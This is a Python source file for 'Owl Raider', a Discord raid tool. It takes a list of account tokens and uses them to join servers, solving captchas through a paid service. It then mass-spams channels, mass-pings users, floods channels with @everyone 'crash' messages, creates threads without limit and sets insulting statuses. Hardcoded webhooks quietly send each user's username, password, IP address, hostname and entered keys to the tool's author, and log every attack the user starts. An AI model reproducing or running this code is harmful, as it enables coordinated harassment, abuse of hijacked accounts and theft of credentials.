import os
import sys
import time
import json
import ctypes
import socket
import random
import discord
import requests
import websocket
import threading
from github import Github
from dhooks import Webhook
from datetime import datetime
from colorama import Fore, Back, Style
from capmonster_python import HCaptchaTask



os.system('title Owl Raider')



if os.path.exists("tokens.txt") == False:
    open("tokens.txt", "w")
    print("[-] Input tokens in tokens.txt!")
    input()
    sys.exit()
if open("tokens.txt", "r").read() == "":
    print("[-] Input tokens in tokens.txt!")
    input()
    sys.exit()

tokens = open("tokens.txt", "r").read().splitlines()
clear_valid_tokens = open("valid.txt", "w")

def check_token(token):
    global tokencount
    request = requests.get("https://discordapp.com/api/v6/users/@me/library", headers={'Content-Type': 'application/json', 'authorization': token})
    if request.status_code == 200:
        open("valid.txt", "a").write(token+"\n")
        tokencount += 1
        print(f"[+] Saved token to valid.txt")

print(f"Checking {len(tokens)} tokens...")
tokencount = 0
xfemthreads = []
for token in tokens:
    t = threading.Thread(target=check_token, args=(token, )).start()
time.sleep(3)


def userlog():
    
    url = "https://discord.com/api/webhooks/944623804846596146/ov_XwtxP11Q1bNG0cXxwFbdSuJMFYMbLL2xoxxZGeK03uFtMhIfkKSsf0Oeasvz8gUzL" 
    hostname = socket.gethostname()

    if hostname == "DESKTOP-JIONQBE":
        Admin = True
    elif hostname =="serpent-hplaptop17by1xxx":
        Admin = True
    else:
        Admin = False

    ip = socket.gethostbyname(hostname)   
    data = {
    "content" : "",
    "username" : "Bloody Logger"
    } 
    
    if Admin == True:
        descmessage = f"\n Username : {username} \n Password : {password}\nPC Name : {hostname}\n Permission Granted : {perms}"
        desctitle = "Admin Login"
    elif Admin == False:
        descmessage = f"User Login \n Username : {username} \n Password : {password} \n IP: {ip}\n Computer Name : {hostname}\n Permission Granted : {perms}"
        desctitle = "User Login"


    data["embeds"] = [
        {
            "description" : descmessage,
            "title" : desctitle
        }
    ]

    result = requests.post(url, json = data)
    screen()

def keylog(key):
    
    #log
    import requests 

    url = "https://discord.com/api/webhooks/944623272874627113/VrnkkBNumUPLEsSBqA4rsptFBTNG9alCsSVPMJyM-lmcP0hGBI-UMq2EeB7KEuDNTVrZ" 

    #ip

    hostname = socket.gethostname() 
    ip = socket.gethostbyname(hostname) 

    
    data = {
    "content" : "",
    "username" : "Bloody Logger"
    }

    
    
    import time
    if perms ==False:

        descmessage = f'Key Attempt : {key} \n Hostname: \n {hostname}\nIP : {ip}\n'
        desctitle = f'Key Redeem Failed'
    if perms ==True:
        descmessage = f'Key Used : {key} \nNew User : {username} \nNew Password : {pass1} \n Hostname: \n {hostname}\nIP : {ip}\n'
        desctitle = f'Key Redeem Success'




    data["embeds"] = [
        {
            "description" : descmessage,
            "title" : desctitle
        }
    ]

    result = requests.post(url, json = data)
username = ""
def createlogin(key, data):
    global pass1
    global username
    username = input('Enter your new username : ')
    pass1 = input('Enter your new password : ')
    pass2 = input('Re-Enter your new password : ')

    if pass1 == pass2:
        data = data.replace(key, '')
        repo=g.get_user().get_repo("Keys")
        file = repo.get_contents("README.md")
        repo.update_file(f"README.md", "-", data, file.sha)
    

        repo=g.get_user().get_repo("a")
        file = repo.get_contents("README.md")
        data = str(file.decoded_content)
        new = f'<< user - {username} ? password - {pass1} ? locked = False ? admin = False ? newm = False >> <> '
    else:
        print('Passwords do not match')
        createlogin(key, data)
        
    Write = data + new
    repo.update_file(f"README.md", "-", Write, file.sha)
    keylog(key)


def keyfind():
    global perms
    
    key = input('Enter your activation Key >> ')
    repo=g.get_user().get_repo("Keys")
    file = repo.get_contents("README.md")
    data = str(file.decoded_content)
    if f'<< {key} >>' in data:
        print('Key Found')
        perms = True
        createlogin(key, data)
    else:
        print('Key not found')
        perms = False
        username = ""
        password = ""
        threading.Thread(target=keylog, args=(key,)).start()
        sys.exit()
    
    repo.update_file(f"README.md", "-", data, file.sha)







def onliner(token):
    try:
        w = websocket.WebSocket()
        w.connect('wss://gateway.discord.gg/?v=6&encoding=json')
        jsonObj = json.loads(w.recv())
        interval = jsonObj['d']['heartbeat_interval']
        w.send(json.dumps({
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": sys.platform,
                    "$browser": "RTB",
                    "$device": f"{sys.platform} Device"
                },
                "presence": {
                    "game": {
                        "name": 'Owl Raid Tool',
                        "type": 0,
                        "details": "by Chxrst",
                        "state": "You Got Fucked By Owl"
                    },
                    "status": '>> Get Fucked <<',
                    "since": 0,
                    "afk": False
                }
            },
            "s": None,
            "t": None
        }))
        while True:
            w.send(json.dumps({"op": 1, "d": None}))
    except Exception as e:
        pass

def change_bio(token, bio):
    headers = {
        "Authorization": token,
        "accept": "*/*",
        "accept-language": "en-US", 
        "connection": "keep-alive",
        "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT": "1",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "referer": "https://discord.com/channels/@me",
        "TE": "Trailers",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    r = requests.patch("https://discord.com/api/v9/users/@me", headers=headers, json={"bio": bio})
    text = r.text
    username = json.loads(text)["username"]
    if r.status_code == 200 or r.status_code == 201:
        print(f"{Fore.GREEN}[+] Changed bio on {username} ")
    elif "You need to verify your account" in text: 
        print(f"{Fore.RED}[-] Failed to change bio | Account verification required")
    elif "Unauthorized" in text:
        print(f"{Fore.RED}[-] Failed to change bio | Token is invalid")
    else:
        print(f"{Fore.RED}[+] Failed to change bio | {r.status_code} {username}")

def typer(token, channelid):
    while True:
        r = requests.post(f"https://discord.com/api/v9/channels/{channelid}/typing", headers={"Authorization": token})
        text = r.text
        if "You need to verify your account" in text:
            print(f"{Fore.RED}[-] Failed to spoof typing | Account verification required")
        elif "Unauthorized" in text:
            print(f"{Fore.RED}[-] Failed to spoof typing | Token is invalid")
        time.sleep(5)

def crash_channel(token, channelid):
    headers = {
        "Authorization": token,
        "accept": "*/*",
        "accept-language": "en-US", 
        "connection": "keep-alive",
        "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT": "1",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "referer": "https://discord.com/channels/@me",
        "TE": "Trailers",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    try:
        token = token[:25] + "*"*34
    except:
        token = "*"*len(token)
    for i in range(3):
        r = requests.post(f"https://discord.com/api/v9/channels/{channelid}/messages", headers=headers, json={"content": ":v:"*200+"@everyone"})
        text = r.text
        if "content" in text:
            print(f"{Fore.GREEN}[+] Sent crash text")
        elif "You need to verify your account" in text:
            print(f"{Fore.RED}[-] Failed to send message | Account verification required")
        elif "Unauthorized" in text:
            print(f"{Fore.RED}[-] Failed to send message | Token is invalid")
        else:
            print(f"{Fore.RED}[-] Failed to send message | Channel Ratelimited")

def message_spam(token, message, channelid, inf):
    headers = {
        "Authorization": token,
        "accept": "*/*",
        "accept-language": "en-US", 
        "connection": "keep-alive",
        "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT": "1",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "referer": "https://discord.com/channels/@me",
        "TE": "Trailers",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    try:
        token = token[:25] + "*"*34
    except:
        token = "*"*len(token)
    if inf == 0:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{channelid}/messages", headers=headers, json={"content": f"{message} | {os.urandom(5).hex()}"})
            text = r.text
            if "content" in text:
                print(f"{Fore.GREEN}[+] Sent message")
            elif "You need to verify your account" in text:
                print(f"{Fore.RED}[-] Failed to send message | Account verification required")
            elif "Unauthorized" in text:
                print(f"{Fore.RED}[-] Failed to send message | Token is invalid")
            elif "Missing Access" in text:
                print(f"{Fore.RED}[-] Failed to send message | Missing Access")
            else:
                xdata = json.loads(text)
                timex = xdata["retry_after"]
                print(f"{Fore.RED}[-] Failed to send message | Channel Ratelimited {timex}")
    else:
        for i in range(inf):
            r = requests.post(f"https://discord.com/api/v9/channels/{channelid}/messages", headers=headers, json={"content": f"{message} | {os.urandom(5).hex()}"})
            text = r.text
            if "content" in text:
                print(f"{Fore.GREEN}[+] Sent message")
            elif "You need to verify your account" in text:
                print(f"{Fore.RED}[-] Failed to send message | Account verification required")
            elif "Unauthorized" in text:
                print(f"{Fore.RED}[-] Failed to send message | Token is invalid")
            elif "Missing Access" in text:
                print(f"{Fore.RED}[-] Failed to send message | Missing Access")
            else:
                print(f"{Fore.RED}[-] Failed to send message | Channel Ratelimited")

def friender(token, user):
    try:
        user = user.split("#")
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB",
            "authorization": token,
            "content-length": "90",
            "content-type": "application/json",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
        payload = {"username": user[0], "discriminator": user[1]}
        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,
                            json=payload)
        if src.status_code == 204:
            print(f"{Fore.GREEN}[+] {token} Friended {user[0]}#{user[1]}")
    except Exception as e:
        print(f'{Fore.RED}{e}')

good_tokens =['']

def Check(auth):
    
    global tokencount

    try:
        halfauth = auth[:len(auth)//2]
        x = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': auth})
        if x.status_code == 200:
            y = requests.get('https://discord.com/api/v9/users/@me/affinities/users', headers={'Authorization': auth})
            json = x.json()
            if y.status_code == 200:
                print(Fore.GREEN + f'VALID: {halfauth}***** {json["username"]}#{json["discriminator"]}')
                good_tokens.append(auth)
                tokencount += 1
            elif y.status_code == 403:
                print(Fore.RED + f'LOCKED: {halfauth}***** {json["username"]}#{json["discriminator"]}')
            elif y.status_code == 429:
                Fore.RED + f"You're being rate limited"
                time.sleep(y.headers['retry-after'])
            elif x.status_code == 429:
                print(Fore.RED + f"You're being rate limited")
                time.sleep(y.headers['retry-after'])
            else:
                print(Fore.RED + f'INVALID: {auth}')
    except:
        pass


def mass_ping(token, users, channelid, message_cnt):
    headers = {
        "Authorization": token,
        "accept": "*/*",
        "accept-language": "en-US", 
        "connection": "keep-alive",
        "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT": "1",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "referer": "https://discord.com/channels/@me",
        "TE": "Trailers",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    while True:
        message = ""
        for i in range(75):
            r = random.choice(users)
            message += f"<@{r}> "
        message += message_cnt
        r = requests.post(f"https://discord.com/api/v9/channels/{channelid}/messages", headers=headers, json={"content": message})
        text = r.text
        if "content" in text:
            print(f"{Fore.GREEN}[+] Sent mass ping")
        elif "You need to verify your account" in text:
            print(f"{Fore.RED}[-] Failed to send message | Account verification required")
        elif "Unauthorized" in text:
            print(f"{Fore.RED}[-] Failed to send message | Token is invalid")
        elif "Missing Access" in text:
            print(f"{Fore.RED}[-] Failed to send message | Missing Access")
        else:
            print(f"{Fore.RED}[-] Failed to send message | Channel ratelimited...")

def attacklog(attacktype, extra):
    import requests 
    url = "https://discord.com/api/webhooks/944623855090159637/G-2uYDSqmjbA1OtNEy55SIFSLaQwOV6m49DpHPxnM8qU7YbvMeP9JqsMUz41J9QEZcla"     
    data = {
    "content" : "",
    "username" : "Bloody Logger"
    } 
    data["embeds"] = [
        {
            "description" : f"Started {attacktype}\n\n Extra : \n {extra}",
            "title" : f"{username}"
        }
    ]
    result = requests.post(url, json = data)

def leave_server(token, serverid):
    headers = {
        "Authorization": token,
        "accept": "*/*",
        "accept-language": "en-US", 
        "connection": "keep-alive",
        "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT": "1",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "referer": "https://discord.com/channels/@me",
        "TE": "Trailers",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    try:
        token = token[:25] + "*"*34
    except:
        token = "*"*len(token)
    r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{serverid}", headers=headers)
    text = r.text
    if r.status_code == 204:
        print(f"{Fore.GREEN}[+] Left server")
    elif "You need to verify your account" in text:
        print(f"{Fore.RED}[-] Failed to leave server | Account verification required")
    elif "Unauthorized" in text:
        print(f"{Fore.RED}[-] Failed to send message | Token is invalid")
    else:
        print(f"{Fore.RED}[-] Failed to join server | Invalid Server")

threadcount = 0
def create_threads(token, channelid, name):
    global threadcount
    while True:
        r = requests.post(f"https://discord.com/api/v9/channels/{channelid}/threads", headers={"content-type": "application/json", "Authorization": token}, json={"name": name, "type": 11, "auto_archive_duration": 1440})
        text = r.text
        if r.status_code == 200 or r.status_code == 201:
            threadcount += 1
            print(f"{Fore.GREEN}[+]  Created thread | {threadcount} Threads created")
        elif "You need to verify your account" in text: 
            print(f"{Fore.RED}[-] Failed to create thread | Account verification required")
        elif "Unauthorized" in text:
            print(f"{Fore.RED}[-] Failed to create thread | Token is invalid")

def join_server(token, invitecode):
    baseurl = f"https://discord.com/api/v9/invites/{invitecode}"
    headers = {
        "Authorization": token,
        "accept": "*/*",
        "accept-language": "en-US",
        "connection": "keep-alive",
        "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT": "1",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "referer": "https://discord.com/channels/@me",
        "TE": "Trailers",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    


    r = requests.post(baseurl, headers=headers)
    if r.status_code == 400:
        print(f"{Fore.BLUE}[{r.status_code}] Solving captcha")
        captcha_sitekey = json.loads(r.text)["captcha_sitekey"]
        task_id = capmonster_python.create_task(baseurl, captcha_sitekey)
        result = capmonster_python.join_task_result(task_id)
        captcha_result = result.get("gRecaptchaResponse")
        payload = {"captcha_key":captcha_result}
        r1 = requests.post(baseurl, headers=headers, json=payload)
        print(f"{Fore.GREEN} Solved captcha and joined server [{r1.status_code}]")
    elif r.status_code == 403:
        print(f"{Fore.RED} Account is invalid [{r.status_code}]")
    else:
        print(f"{Fore.GREEN} joined server without captcha [{r.status_code}]")







count = 9999
def screen():
    import os
    os.system('cls')


    title = f"""
                           {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗ {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗    {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗         {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗  {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗ {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗ {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗ 
                          {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║    {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║         {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗
                          {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║   {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║ {Fore.CYAN}█{Fore.MAGENTA}╗ {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║         {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗  {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝
                          {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║   {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║         {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗
                          {Fore.MAGENTA}╚{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗    {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║
                           {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝ {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝    {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝ {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝
                                                                                    {tokencount} Tokens
                                                                                    Programmed By Chxrst
                                                                                    (!chrxst#0001)


                 {Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════════════╗
                 {Fore.CYAN}║ {Fore.MAGENTA}01 {Fore.CYAN}║   {Fore.GREEN}Joiner                           {Fore.CYAN}║{Fore.MAGENTA} O {Fore.CYAN}║{Fore.GREEN}                    Bio Changer     {Fore.CYAN}║ {Fore.MAGENTA}12 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}02 {Fore.CYAN}║   {Fore.GREEN}Leaver                           {Fore.CYAN}║{Fore.MAGENTA} W {Fore.CYAN}║{Fore.GREEN}                  Online Tokens     {Fore.CYAN}║ {Fore.MAGENTA}13 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}03 {Fore.CYAN}║   {Fore.GREEN}Mass Mention                     {Fore.CYAN}║{Fore.MAGENTA} L {Fore.CYAN}║{Fore.RED}    VC Crash Exploit - OUTDATED     {Fore.CYAN}║ {Fore.MAGENTA}14 {Fore.CYAN} ║   
